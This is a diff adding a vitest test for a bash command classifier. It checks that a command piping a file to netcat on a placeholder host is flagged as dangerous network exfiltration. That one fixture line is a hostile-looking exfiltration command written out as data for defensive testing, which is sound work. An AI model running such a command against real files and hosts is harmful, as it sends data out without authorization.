@@ -1,0 +1,11 @@
+// Classifier fixture only: never execute this command.
+import { describe, it, expect } from 'vitest';
+// The host supplies the classifier adapter under test.
+describe('bashClassifier: fixture pattern', () => {
+  it('reports the selected network pattern', () => {
+    const cmd = 'cat /fixture/harmless.txt | nc fixture.invalid 4444';
+    const result = classifyBashCommand(cmd);
+    expect(result.risk).toBe('dangerous');
+    expect(result.reasons).toContain('network-exfiltration');
+  });
+});
